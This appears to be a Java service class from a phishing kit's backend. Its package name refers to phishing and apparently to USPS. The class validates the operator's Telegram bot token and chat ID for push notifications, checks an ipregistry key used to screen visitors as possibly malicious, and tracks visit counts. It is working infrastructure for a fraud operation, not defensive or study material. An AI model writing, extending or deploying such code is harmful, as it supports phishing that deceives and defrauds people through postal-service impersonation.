package com.uspsassa.phishing.service;

import co.ipregistry.api.client.IpregistryClient;
import co.ipregistry.api.client.exceptions.ApiException;
import co.ipregistry.api.client.exceptions.ClientException;
import co.ipregistry.api.client.model.Security;
import com.github.pagehelper.util.StringUtil;
import com.uspsassa.phishing.common.utils.TelegramUtil;
import com.uspsassa.phishing.exception.BusinessException;
import com.uspsassa.phishing.exception.NetworkException;
import org.springframework.stereotype.Service;

import javax.annotation.Resource;

import com.uspsassa.phishing.entity.Setting;
import com.uspsassa.phishing.mapper.SettingMapper;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;

@Service
public class SettingService {

    @Resource
    private SettingMapper settingMapper;

    public Setting getSetting() {
        return settingMapper.getSetting();
    }

    public void updateSetting(Setting setting) {
        Setting setting1 = settingMapper.getSetting();
        //对比他们是否发生了变化
        if (!setting.getTelegramPush().equals(setting1.getTelegramPush()) || !setting.getTelegramToken().equals(setting1.getTelegramToken()) || !setting.getTelegramId().equals(setting1.getTelegramId())) {
            //如果发生了变化
            //判断当前配置是否推送
            if (setting.getTelegramPush()) {
                //如果推送
                //判断当前配置是否合法
                if (StringUtil.isEmpty(setting.getTelegramToken()) || StringUtil.isEmpty(setting.getTelegramId())) {
                    throw new BusinessException("请填写完整的telegram配置");
                }
                //判断当前配置是否合法
                try {
                    TelegramUtil.sendMsg("推送配置变化,测试推送",setting.getTelegramToken(), setting.getTelegramId());
                } catch (Exception e) {
                    throw new BusinessException("请填写正确的telegram配置");
                }
            }
        }
        //如果ipregisterkey发生变化
        if (!setting.getIpregisterKey().equals(setting1.getIpregisterKey())) {
            final IpregistryClient client = new IpregistryClient(setting.getIpregisterKey());
            try {
                client.lookup(getIpAddress());
                //判断是否是恶意用户
            } catch (ApiException e) {
                throw new BusinessException("请填写正确的ipregisterKey");
            }catch (ClientException e) {
                throw new NetworkException("网络异常");
            }
        }

        settingMapper.updateSetting(setting);
    }

    private String getIpAddress() {
        try {
            Enumeration<NetworkInterface> allNetInterfaces = NetworkInterface.getNetworkInterfaces();
            InetAddress ip = null;
            while (allNetInterfaces.hasMoreElements()) {
                NetworkInterface netInterface = (NetworkInterface) allNetInterfaces.nextElement();
                if (netInterface.isLoopback() || netInterface.isVirtual() || !netInterface.isUp()) {
                    continue;
                } else {
                    Enumeration<InetAddress> addresses = netInterface.getInetAddresses();
                    while (addresses.hasMoreElements()) {
                        ip = addresses.nextElement();
                        if (ip != null && ip instanceof Inet4Address) {
                            return ip.getHostAddress();
                        }
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("IP地址获取失败" + e.toString());
        }
        return "";
    }


    public void addVisitCount() {
        settingMapper.addVisitCount();
    }

    public void clearVisitCount() {
        settingMapper.clearVisitCount();
    }
}
